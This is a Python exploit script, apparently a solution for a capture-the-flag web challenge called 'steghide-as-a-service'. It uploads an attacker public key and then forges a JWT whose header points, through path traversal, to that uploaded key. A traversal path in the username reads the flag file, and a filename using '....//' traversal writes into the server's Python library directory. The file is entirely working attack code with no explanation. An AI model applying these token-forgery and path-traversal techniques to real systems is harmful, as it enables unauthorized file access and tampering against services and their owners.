import requests
import jwt
import random
import string

local = False

app_path = '/app'
target_url = 'http://steghide-as-a-service.chal.idek.team'
target_pub_file = 'cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl'
outfilename = 'remote.jpg'

def rand_string():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))

def get_file_for_upload(filename):
    return {
        'file': (filename, open('jpeg-home.jpg', 'rb')),
    }

def gen_public_key_on_server():
    session = requests.Session()
    session.get(f'{target_url}/')

    files = get_file_for_upload(f'jpeg-home-{rand_string()}.jpg')

    data = {
        'content': open('keys/public.pem').read(),
        'password': 'secret-1'
    }

    response = session.post(f'{target_url}/upload', files=files, data=data)
    with open(outfilename, 'wb') as outfile:
        outfile.write(response.content)

def create_token(username, pubkey):
    priv_key = open('keys/private.pem', 'r').read()
    token = jwt.encode({"username": username}, priv_key, algorithm='RS256', headers={'pubkey': pubkey})
    return token.decode('ascii')

def get_flag(token):
    cookies = {
        'session': token,
    }

    # files = get_file_for_upload('....//__pycache') # Server do not have it :@
    files = get_file_for_upload('....//....//....//....//usr/local/lib/python3.8/http/__pycache')

    data = {
        'content': 'me',
        'password': 'secret-1'
    }

    response = requests.post(f'{target_url}/upload', cookies=cookies, files=files, data=data)
    return response.text

def attack():
    flag_path_traversal = f'_/../../../../../../../app/flag.txt'
    pubkey_path_traversal = f'../{app_path}/uploads/{target_pub_file}.txt'

    poisoned_token = create_token(flag_path_traversal, pubkey_path_traversal)

    print(poisoned_token)

    print()

    print(get_flag(poisoned_token))

# gen_public_key_on_server()
attack()